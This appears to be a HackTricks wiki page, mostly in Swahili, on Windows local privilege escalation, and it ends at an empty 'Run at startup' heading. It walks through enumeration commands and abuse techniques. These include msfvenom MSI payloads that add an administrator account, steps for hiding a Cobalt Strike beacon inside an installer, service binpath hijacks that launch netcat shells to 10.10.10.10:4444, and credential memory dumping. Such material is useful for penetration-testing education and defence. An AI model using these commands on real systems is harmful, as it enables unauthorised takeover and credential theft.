# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Chombo bora cha kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya Mwanzo ya Windows

### Access Tokens

**Ikiwa hujui Windows Access Tokens ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels katika Windows ni nini, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Udhibiti wa Usalama wa Windows

Kuna mambo tofauti ndani ya Windows ambayo yanaweza **prevent you from enumerating the system**, kuendesha executables au hata **detect your activities**. Unapaswa **soma** {{#raw}}**{{/raw}} ukurasa ufuatao na **kuorodhesha** zote hizi **mbinu** **za ulinzi** kabla ya kuanza privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Taarifa za Mfumo

### Version info enumeration

Angalia ikiwa toleo la Windows lina udhaifu lolote linalojulikana (angalia pia patches zilizowekwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Hii [site](https://msrc.microsoft.com/update-guide/vulnerability) ni ya msaada kutafuta taarifa za kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya 4,700 udhaifu wa usalama, ikionyesha **massive attack surface** ambayo mazingira ya Windows yanayoonyesha.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Kwenye mashinani na taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info zilizohifadhiwa katika env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Historia
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

Unaweza kujifunza jinsi ya kuwasha hili katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline za PowerShell yanarekodiwa, yakijumuisha amri zilizotekelezwa, miito ya amri, na sehemu za skripti. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya pato yanaweza kutochukuliwa.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona hafla 15 za mwisho kutoka kwenye PowersShell logs, unaweza kuendesha:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na ya maudhui yote ya utekelezaji wa script inahifadhiwa, ikihakikisha kuwa kila sehemu ya msimbo imeandikwa wakati inavyoendeshwa. Mchakato huu unahifadhi njia kamili ya ukaguzi wa kila shughuli, yenye thamani kwa forensiki na uchambuzi wa tabia zenye madhara. Kwa kuandika shughuli zote wakati wa utekelezaji, inatoa ufahamu wa kina kuhusu mchakato.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya Script Block yanaweza kupatikana ndani ya Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Intaneti
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kupata udhibiti wa mfumo ikiwa sasisho hazitaombwa kwa http**S** bali kwa http.

Anza kwa kukagua kama mtandao unatumia sasisho za WSUS zisizo za SSL kwa kuendesha yafuatayo katika cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au yafuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ikiwa utapokea jibu kama moja ya hizi:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Basi, **inaweza kutumiwa.** Ikiwa rekodi ya mwisho ya rejista ni sawa na 0, basi ingizo la WSUS litaachwa.

Ili kutekeleza udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Hizi ni skripti za exploit zilizotengenezwa kwa matumizi ya MiTM ili kuingiza masasisho 'bandia' kwenye trafiki ya WSUS isiyo ya SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kwa kifupi, hili ndilo kosa ambalo mdororo huu unalenga kutumia:

> Ikiwa tuna uwezo wa kubadilisha proxy ya mtumiaji wetu wa ndani, na Windows Updates inatumia proxy iliyowekwa katika mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya mashine yetu ili kukamata trafiki yetu wenyewe na kuendesha msimbo kama mtumiaji mwenye viwango vilivyoongezwa.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS inatumia mipangilio ya mtumiaji wa sasa, itatumia pia duka la vyeti la mtumiaji huo. Ikiwa tutatengeneza cheti kilichojiwekea kwa jina la mwenyeji wa WSUS na kuongeza cheti hicho kwenye duka la vyeti la mtumiaji wa sasa, tutaweza kukamata trafiki ya WSUS ya HTTP na HTTPS. WSUS haina mbinu kama HSTS za kutekeleza uthibitisho wa kuamini-mara-ya-mwanzo kwenye cheti. Ikiwa cheti kinachowasilishwa kinatambulika na mtumiaji na kina jina sahihi la mwenyeji, kitakubaliwa na huduma.

Unaweza kutekeleza udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara itakapotolewa).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wakala wengi wa kampuni huweka uso wa localhost IPC na njia ya masasisho yenye ruhusa. Ikiwa usajili unaweza kulazimishwa kwa seva ya mshambuliaji na updater inamtumaini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kusambaza MSI mbaya ambayo huduma ya SYSTEM itaisakinisha. Angalia mbinu ya jumla (inayotegemea mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Kuna udhaifu wa **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya yanajumuisha mazingira ambapo **LDAP signing is not enforced,** watumiaji wana haki za kujitegemea zinazowawezesha kusanidi **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba mahitaji haya yanatimizwa kwa kutumia **default settings**.

Pata **exploit** katika [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa taarifa zaidi kuhusu mtiririko wa shambulio angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ikiwa** vigezo hivi viwili vya rejista vimewezeshwa (thamani ni **0x1**), basi watumiaji wa ngazi yoyote ya ruhusa wanaweza **kufunga** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una meterpreter session unaweza kuotomatisha mbinu hii kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa binary ya Windows MSI ili kuinua vibali. Script hii inaandika msanidi MSI uliotayarishwa awali ambao utauliza kuongeza mtumiaji/kikundi (hivyo utahitaji GIU access):
```
Write-UserAddMSI
```
Tekeleza tu binary iliyoundwa ili escalate privileges.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka unaweza ku-wrap faili ya "**.bat**" ikiwa unataka tu ku-execute **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** na Cobalt Strike au Metasploit payload mpya ya **Windows EXE TCP** katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na andika "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na bonyeza **Next**.
- Mpa mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kwa eneo, chagua **place solution and project in the same directory**, na bonyeza **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 ya 4 (choose files to include). Bonyeza **Add** na chagua Beacon payload uliyoiunda. Kisha bonyeza **Finish**.
- Chagua mradi **AlwaysPrivesc** katika **Solution Explorer** na kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna mali nyingine unaweza kubadilisha, kama **Author** na **Manufacturer** ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya kulia mradi na chagua **View > Custom Actions**.
- Bofya kulia **Install** na chagua **Add Custom Action**.
- Bonyeza mara mbili **Application Folder**, chagua faili yako **beacon.exe** na bonyeza **OK**. Hii itahakikisha kwamba beacon payload itaendeshwa mara installer itakapotekelezwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Hatimaye, **build it**.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` linaonekana, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kuendesha **installation** ya faili hatarishi `.msi` kwa background:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili exploit udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vichunguzi

### Mipangilio ya Ukaguzi

Mipangilio hii inaamua kile kinachorekodiwa (**kinachorekodiwa**), hivyo unapaswa kuwa makini
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — ni muhimu kujua wapi logs zinatumwa.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya usimamizi wa nywila za local Administrator, kuhakikisha kuwa kila nywila ni ya kipekee, ya kiholela, na inasasishwa mara kwa mara kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, wakiruhusiwa kuona local admin passwords ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewezeshwa, **plain-text passwords zinahifadhiwa katika LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa kwa Local Security Authority (LSA) ili **kuzuia** jaribio la michakato isiyo ya kuaminika **kusoma kumbukumbu yake** au kuingiza code, ikiboresha usalama wa mfumo.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Kusudi lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** zinathibitishwa na **Local Security Authority** (LSA) na zinatumika na vipengele vya mfumo wa uendeshaji. Wakati data ya kuingia ya mtumiaji inathibitishwa na kifurushi cha usalama kilichosajiliwa, domain credentials kwa mtumiaji kawaida huanzishwa.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji & Vikundi

### Orodhesha Watumiaji & Vikundi

Unapaswa kuangalia kama kuna vikundi ambavyo uko ndani yake vinavyo ruhusa zenye kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

Ikiwa wewe **belongs to some privileged group you may be able to escalate privileges**. Jifunze kuhusu privileged groups na jinsi ya kuvitumia ili escalate privileges hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu ni nini **token** kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **learn about interesting tokens** na jinsi ya kuvitumia:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Mafolda ya nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Password
```bash
net accounts
```
### Pata yaliyomo kwenye clipboard
```bash
powershell -command "Get-Clipboard"
```
## Mchakato Zinazokimbia

### Ruhusa za Faili na Saraka

Kwanza kabisa, ukiorodhesha michakato **angalia passwords ndani ya command line ya mchakato**.\
Angalia ikiwa unaweza **overwrite some binary running** au ikiwa una ruhusa ya kuandika katika saraka ya binary ili ku-exploit uwezekano wa [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia kama [**electron/cef/chromium debuggers** zinaendeshwa; unaweza kuzitumia vibaya kupandisha ruhusa](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kukagua ruhusa za binaries za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kukagua ruhusa za folda za binaries za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Unaweza kuunda memory dump ya mchakato unaoendelea kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP huwa na **credentials in clear text in memory**, jaribu ku-dump memory na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazoendesha kama SYSTEM zinaweza kumruhusu mtumiaji kuanzisha CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bonyeza "Click to open Command Prompt"

## Services

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa za service
```bash
sc qc <service_name>
```
Inashauriwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia ngazi ya ruhusa inayohitajika kwa kila huduma.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inapendekezwa kuangalia kama "Authenticated Users" wanaweza kubadilisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha huduma

Ikiwa unapata hitilafu hii (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Unaweza kuiwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Zingatia kwamba huduma upnphost inategemea SSDPSRV ili ifanye kazi (for XP SP1)**

**Njia nyingine mbadala** ya tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya huduma**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye huduma, kubadilisha binary inayotekelezwa ya huduma inawezekana. Ili kubadilisha na kuendesha **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha tena huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Madaraka yanaweza kupandishwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu kurekebisha upya binary ya service.
- **WRITE_DAC**: Inawezesha kurekebisha ruhusa, jambo linalowezesha kubadilisha usanidi wa service.
- **WRITE_OWNER**: Inaruhusu kupata umiliki na kurekebisha ruhusa.
- **GENERIC_WRITE**: Inarithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia inarithi uwezo wa kubadilisha usanidi wa service.

Kwa kugundua na kutumia udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Services binaries weak permissions

**Angalia kama unaweza kubadilisha binary inayotekelezwa na service** au kama una **ruhusa za kuandika kwenye folda** ambapo binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (not in system32) na ukakague ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kubadilisha service registry

Unapaswa kuangalia kama unaweza kubadilisha service registry yoyote.\
Unaweza **kuangalia** **uruhusa** zako kwenye service **registry** kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kuangaliwa ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa hivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Idhini za AppendData/AddSubdirectory kwenye rejista ya Services

Ikiwa una idhini hii kwenye rejista, hii inamaanisha **unaweza kuunda rejista ndogo kutoka hii**. Katika kesi ya Windows services hili ni **la kutosha kutekeleza msimbo wowote:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Njia za Service zisizo na nukuu

Ikiwa njia kuelekea executable haiko ndani ya nukuu, Windows itajaribu kutekeleza kila sehemu inayomalizika kabla ya nafasi.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha njia zote za huduma zisizo na nukuu, ukiziondoa zile zinazomilikiwa na huduma za msingi za Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na kutumia** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kutengeneza kwa mkono service binary kwa metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za kurejesha

Windows inaruhusu watumiaji kubainisha hatua ambazo zitatumika ikiwa huduma itashindikana. Kipengele hiki kinaweza kusanidiwa kuashiria binary. Iwapo binary hii inaweza kubadilishwa, privilege escalation inawezekana. Maelezo zaidi yanaweza kupatikana katika [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Programu

### Programu zilizowekwa

Angalia **ruhusa za binaries** (labda unaweza kuandika juu ya moja na ku-escalate privileges) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia kama unaweza kubadilisha baadhi ya config file ili kusoma faili maalum au kama unaweza kubadilisha binary itakayotekelezwa na akaunti ya Administrator (schedtasks).

Njia mojawapo ya kupata ruhusa dhaifu za folda/faili kwenye mfumo ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Run at startup

